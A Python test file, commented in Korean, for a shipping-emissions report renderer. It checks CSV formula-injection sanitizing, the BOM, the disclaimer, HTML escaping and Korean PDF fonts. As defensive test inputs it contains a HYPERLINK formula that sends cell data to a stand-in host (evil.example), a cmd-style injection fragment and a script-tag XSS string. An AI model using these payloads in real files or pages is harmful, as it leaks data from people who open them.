"""리포트 렌더링 검증 (PRD §25 · TEST_PLAN §3.4~§3.5, #361).

DB 없이 돈다 — 문서 모델을 손으로 만들어 **렌더러만** 본다. 데이터 수집은
``test_reports_db.py``가 맡는다.

이 파일이 고정하는 것 넷.

* **CSV injection 방어** — 우리가 만든 문서가 공격 매개가 되면 안 된다.
* **UTF-8 BOM** — 없으면 한국어 Windows Excel에서 한글이 전부 깨진다.
* **면책 문구** — `PRD §25.1`이 **문서 본문** 노출을 요구한다. 화면 게시로는 부족하다.
* **HTML escape** — 선박명은 사용자 입력이다.
"""

from __future__ import annotations

import pytest

from cii_platform.reports.csv_export import BOM, render_csv, sanitize
from cii_platform.reports.document import (
    DISCLAIMER,
    KeyValueSection,
    ReportDocument,
    TableSection,
)
from cii_platform.reports.html import render_html


def _document(**over) -> ReportDocument:
    fields = {
        "title": "연간 실적 리포트 — STAR SKIPPER (2026)",
        "slug": "annual-report-x",
        "meta": [("선박", "STAR SKIPPER"), ("IMO", "9123456")],
        "sections": [
            KeyValueSection(
                title="2026년 누적 (YTD)",
                rows=[("실적 CII", "18.637188"), ("등급", "B")],
                note="연중 누적 예측값이며 공식 등급이 아닙니다.",
            ),
            TableSection(
                title="연도별 추이",
                headers=["연도", "실적 CII", "등급"],
                rows=[["2024", "17.100000", "A"], ["2025", "18.200000", "B"]],
            ),
        ],
        "warnings": ["REFERENCE_ONLY"],
    }
    fields.update(over)
    return ReportDocument(**fields)


# ─────────────────────────────────────────────────────────────────────────────
# CSV injection — TEST_PLAN §3.4~§3.5
# ─────────────────────────────────────────────────────────────────────────────


@pytest.mark.parametrize("prefix", ["=", "+", "-", "@", "\t", "\r"])
def test_dangerous_prefixes_are_neutralized(prefix):
    """스프레드시트가 수식으로 해석하는 시작 문자에 작은따옴표를 붙인다."""
    assert sanitize(f"{prefix}CMD").startswith("'")


def test_hyperlink_exfiltration_is_neutralized():
    """실제 공격 형태 — 파일을 연 사람의 데이터가 외부로 나간다."""
    payload = '=HYPERLINK("http://evil.example/?v="&A1,"click")'
    assert sanitize(payload) == f"'{payload}"


def test_negative_numbers_also_get_the_prefix():
    """음수도 예외로 두지 않는다.

    `-12.5`는 정상 값이지만, 여기서 예외를 만들면 `-1+1+cmd|...` 같은 값이 그 예외로
    빠져나간다. 「값이 수식인가」로 판정하면 판정기 자체가 취약점이 된다.
    """
    assert sanitize("-12.5") == "'-12.5"


def test_safe_values_are_untouched():
    for value in ["STAR SKIPPER", "18.637188", "B", "gCO₂/(DWT·nm)", ""]:
        assert sanitize(value) == value


def test_injection_defense_applies_to_every_cell():
    """머리글·값·각주 어디로 들어와도 막힌다 — 한 곳만 빠져도 방어가 아니다."""
    document = _document(
        sections=[
            TableSection(
                title="=TITLE",
                headers=["=HEAD"],
                rows=[["=CELL"]],
                note="=NOTE",
            )
        ]
    )
    csv_text = render_csv(document)
    for token in ["'=TITLE", "'=HEAD", "'=CELL", "'=NOTE"]:
        assert token in csv_text


# ─────────────────────────────────────────────────────────────────────────────
# 인코딩·포맷
# ─────────────────────────────────────────────────────────────────────────────


def test_csv_starts_with_bom():
    """없으면 한국어 Windows Excel이 CP949로 읽어 한글이 전부 깨진다."""
    assert render_csv(_document()).startswith(BOM)


def test_csv_uses_crlf():
    """RFC 4180 §2. LF만 쓰면 구형 Excel이 한 줄로 읽는 경우가 있다."""
    assert "\r\n" in render_csv(_document())


def test_csv_keeps_korean():
    csv_text = render_csv(_document())
    assert "STAR SKIPPER" in csv_text
    assert "연도별 추이" in csv_text


def test_csv_is_streamed_in_pieces():
    """한 번에 문자열을 만들지 않는다 — 큰 선대에서 그대로 메모리 사용량이 된다."""
    from cii_platform.reports.csv_export import iter_csv

    chunks = list(iter_csv(_document()))
    assert len(chunks) > 1
    assert chunks[0].startswith(BOM)


# ─────────────────────────────────────────────────────────────────────────────
# 면책 — PRD §25.1
# ─────────────────────────────────────────────────────────────────────────────


def test_disclaimer_is_in_csv():
    assert DISCLAIMER in render_csv(_document())


def test_disclaimer_is_in_html_body_and_footer():
    """`PRD §25.1`이 **표지·푸터** 둘 다를 요구한다.

    첫 장만 읽고 덮는 독자와 발췌 인쇄본 독자가 다르다.
    """
    html = render_html(_document())
    assert html.count(DISCLAIMER) >= 2  # 표지 <p> + @bottom-center


def test_disclaimer_text_matches_prd():
    """`PRD §6.3` 확정 문구 — 임의로 다시 쓰지 않는다."""
    assert DISCLAIMER == "본 리포트는 참고용 예측값입니다. 규제 제출용 공식 문서가 아닙니다."


# ─────────────────────────────────────────────────────────────────────────────
# HTML
# ─────────────────────────────────────────────────────────────────────────────


def test_html_escapes_user_supplied_names():
    """선박명은 사용자 입력이다 — 미리보기 화면에서 실행되면 안 된다."""
    html = render_html(_document(title="<script>alert(1)</script>"))
    assert "<script>alert(1)</script>" not in html
    assert "&lt;script&gt;" in html


def test_html_does_not_pin_a_font_name():
    """이름을 박으면 폰트 패키지가 바뀔 때 **조용히 tofu로** 렌더링된다.

    fontconfig가 `sans-serif`를 설치된 한국어 폰트로 해결하게 둔다.
    """
    html = render_html(_document())
    assert "font-family: sans-serif" in html
    assert "Nanum" not in html


def test_html_has_no_external_resources():
    """외부 자원을 타면 오프라인 시연에서 문서가 달라 보이고, 그 차이가 PDF에 굳는다."""
    html = render_html(_document())
    for token in ["http://", "https://", "<link", "<script"]:
        assert token not in html


def test_html_marks_numeric_cells():
    """수치는 오른쪽 정렬 + 자릿수 고정폭 — 세로로 자릿수가 맞아야 읽힌다."""
    html = render_html(_document())
    assert '<td class="num">18.637188</td>' in html
    # 값을 바꾸지는 않는다 — 정렬 판정일 뿐이다.
    assert "18.637188" in html


def test_html_keeps_every_section():
    html = render_html(_document())
    assert "2026년 누적 (YTD)" in html
    assert "연도별 추이" in html
    assert "REFERENCE_ONLY" in html


# ─────────────────────────────────────────────────────────────────────────────
# 문서 모델 검증
# ─────────────────────────────────────────────────────────────────────────────


def test_row_width_mismatch_is_caught():
    """어긋나면 CSV 열이 밀려 **다음 열의 값으로 읽힌다** — 조용히 틀리는 방식이다."""
    document = _document(sections=[TableSection(title="표", headers=["a", "b"], rows=[["1"]])])
    with pytest.raises(ValueError, match="열 수"):
        render_csv(document)


def test_empty_document_renders():
    """섹션이 없는 문서도 면책은 나가야 한다."""
    document = ReportDocument(title="빈 리포트", slug="empty")
    assert DISCLAIMER in render_csv(document)
    assert DISCLAIMER in render_html(document)


# ─────────────────────────────────────────────────────────────────────────────
# PDF — 환경이 갖춰졌을 때만
# ─────────────────────────────────────────────────────────────────────────────


def test_pdf_renders_korean_without_tofu():
    """**이 이슈의 완료 기준**이다 — PDF에 한글이 깨지지 않아야 한다.

    폰트가 없으면 오류가 아니라 tofu(□□□)로 조용히 렌더링되므로, 바이트 길이가
    아니라 **추출된 텍스트**로 확인한다. 폰트가 빠지면 추출 텍스트가 비거나
    깨지므로 이 단언이 먼저 깨진다.

    CI는 `libpango` · `fonts-nanum`을 설치한다 — 없는 환경에서는 건너뛴다.
    """
    pdf_module = pytest.importorskip("cii_platform.reports.pdf")
    if not pdf_module.is_available():
        pytest.skip("WeasyPrint 런타임(Pango)이 없는 환경")
    if not pdf_module.has_korean_font():
        # 로컬 개발 박스에는 한국어 폰트가 없을 수 있다. CI는 fonts-nanum을 설치하므로
        # 여기서 건너뛰지 않는다 — 회귀를 잡는 것은 CI다.
        pytest.skip("한국어 폰트가 설치되지 않은 환경 (CI는 fonts-nanum을 설치한다)")

    pdf = pdf_module.render_pdf(render_html(_document()))
    assert pdf.startswith(b"%PDF-")

    reader = pytest.importorskip("pypdf", reason="pypdf 없이는 텍스트 추출을 못 한다")
    import io

    text = reader.PdfReader(io.BytesIO(pdf)).pages[0].extract_text()
    assert "연간 실적 리포트" in text
    assert "STAR SKIPPER" in text
    # 면책이 문서 안에 있어야 한다 (PRD §25.1).
    assert "참고용 예측값" in text


def test_missing_korean_font_is_detected_not_ignored():
    """폰트가 없으면 오류 없이 tofu가 된다 — 그 상태를 코드가 알아채야 한다.

    이 함수가 없으면 배포 이미지에서 폰트 패키지가 빠져도 아무것도 실패하지 않고
    문서의 한글만 □□□가 된다.
    """
    from cii_platform.reports import pdf as pdf_module

    if not pdf_module.is_available():
        pytest.skip("WeasyPrint 런타임(Pango)이 없는 환경")

    # 참/거짓 어느 쪽이든 **판정 자체가 동작**해야 한다. 환경에 따라 값이 갈리므로
    # 값을 단언하지 않고 예외 없이 bool을 돌려주는 것을 본다.
    assert isinstance(pdf_module.has_korean_font(), bool)


def test_pdf_error_names_the_cause_and_offers_csv():
    """렌더러가 없을 때 사용자를 막다른 길에 두지 않는다."""
    from cii_platform.reports.pdf import PdfUnavailableError

    error = PdfUnavailableError("libpango not found")
    assert error.http_status == 500  # 배포 환경 문제이지 요청 문제가 아니다
    assert "CSV" in error.message
    assert "libpango" in error.message
